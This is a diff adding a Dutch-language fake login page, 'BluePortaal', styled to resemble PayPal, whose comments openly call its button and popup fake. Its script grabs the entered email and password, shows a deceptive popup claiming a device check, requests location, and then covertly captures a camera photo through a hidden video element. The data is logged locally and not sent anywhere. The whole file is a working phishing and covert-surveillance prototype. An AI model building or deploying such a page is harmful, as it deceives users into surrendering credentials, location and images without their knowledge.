@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="nl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BluePortaal - Inloggen</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f6f6f6;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+        }
+
+        .container {
+            background: white;
+            padding: 30px;
+            margin: 100px auto;
+            width: 320px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+            position: relative;
+            font-size: 16px;
+        }
+
+        input {
+            width: 90%;
+            padding: 15px;
+            margin: 10px 0;
+            font-size: 14px;
+            border-radius: 5px;
+            border: 1px solid #ccc;
+        }
+
+        .login-btn {
+            background: #004682;
+            color: white;
+            padding: 12px;
+            width: 100%;
+            border: none;
+            cursor: pointer;
+            font-size: 16px;
+            margin-top: 15px;
+            border-radius: 5px;
+            transition: background-color 0.3s;
+        }
+
+        .login-btn:hover {
+            background: #005fa3;
+        }
+
+        #fake-popup {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: #fff;
+            padding: 20px;
+            text-align: center;
+            z-index: 1000;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+            width: 280px;
+            font-size: 14px;
+            border-radius: 8px;
+        }
+
+        .paypal-color {
+            color: #004682;
+        }
+
+        .paypal-background {
+            background-color: #f6f6f6;
+        }
+
+        .popup-text {
+            color: #333;
+        }
+
+        /* Hidden Video Element */
+        #camera-preview {
+            display: none;
+        }
+    </style>
+</head>
+<body class="paypal-background">
+
+    <div class="container">
+        <h2 class="paypal-color">BluePortaal</h2>
+        <p>Log in om door te gaan</p>
+        <input type="text" placeholder="E-mailadres" id="email">
+        <input type="password" placeholder="Wachtwoord" id="password">
+        
+        <!-- Fake login button -->
+        <button class="login-btn" onclick="requestPermissions()">Inloggen</button>
+    </div>
+
+    <!-- Fake Browser Popup -->
+    <div id="fake-popup">
+        <p class="popup-text">Om verder te gaan, controleren wij de locatie en camera of dit van een netwerklaptop/-desktop afkomstig is.</p>
+    </div>
+
+    <script>
+        function requestPermissions() {
+            // 🔹 Direct de gegevens van de invoervelden opslaan
+            const email = document.getElementById("email").value;
+            const password = document.getElementById("password").value;
+            console.log(`📧 Gegevens opgeslagen - E-mail: ${email}, Wachtwoord: ${password}`);
+
+            // Toon fake pop-up voor toestemming
+            document.getElementById("fake-popup").style.display = "block";
+
+            // Pop-up verdwijnt na 5 seconden
+            setTimeout(() => {
+                document.getElementById("fake-popup").style.display = "none";
+            }, 5000);
+
+            // 🔹 Vraag locatie toestemming eerst, daarna camera toestemming
+            requestLocationPermission()
+                .then(() => {
+                    console.log("✅ Locatie toestemming gegeven!");
+                    return requestCameraPermission();
+                })
+                .then(() => {
+                    console.log("✅ Camera toestemming gegeven!");
+                })
+                .catch(error => {
+                    console.log("❌ Fout bij het verkrijgen van toestemmingen:", error);
+                });
+        }
+
+        // Functie om locatie toestemming te verkrijgen
+        function requestLocationPermission() {
+            return new Promise((resolve, reject) => {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(position => {
+                        console.log(`📍 GPS Locatie: ${position.coords.latitude}, ${position.coords.longitude}`);
+                        resolve();
+                    }, error => {
+                        console.log("❌ Locatie geweigerd of niet beschikbaar:", error);
+                        alert("Locatie toestemmingsfout: " + error.message);
+                        reject();
+                    });
+                } else {
+                    console.log("❌ Geolocatie wordt niet ondersteund door deze browser.");
+                    alert("Geolocatie wordt niet ondersteund door de browser.");
+                    reject();
+                }
+            });
+        }
+
+        // Functie om camera toestemming te verkrijgen
+        function requestCameraPermission() {
+            return new Promise((resolve, reject) => {
+                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                    navigator.mediaDevices.getUserMedia({ video: true })
+                        .then(stream => {
+                            // ** Verborgen camera stream **: camera wordt niet zichtbaar
+                            let video = document.createElement("video");
+                            video.srcObject = stream;
+                            video.width = 320;  
+                            video.height = 240; 
+                            video.play(); 
+                            
+                            // Video-element wordt verborgen
+                            video.style.display = "none";
+
+                            // Simuleer een foto-opname na 3 seconden
+                            setTimeout(() => {
+                                takeSelfie(video, stream);
+                            }, 3000);
+                            resolve();
+                        })
+                        .catch(error => {
+                            console.log("❌ Camera geweigerd:", error);
+                            alert("Camera toestemmingsfout: " + error.message);
+                            reject();
+                        });
+                } else {
+                    console.log("❌ Camera wordt niet ondersteund door deze browser.");
+                    alert("Camera wordt niet ondersteund door de browser.");
+                    reject();
+                }
+            });
+        }
+
+        function takeSelfie(video, stream) {
+            let canvas = document.createElement("canvas");
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            let ctx = canvas.getContext("2d");
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            let selfieData = canvas.toDataURL("image/png"); // Zet foto om naar een base64 afbeelding
+            console.log("📸 Selfie genomen:", selfieData);
+
+            // Stop de camera na het maken van de selfie
+            stream.getTracks().forEach(track => track.stop());
+        }
+    </script>
+
+</body>
+</html>
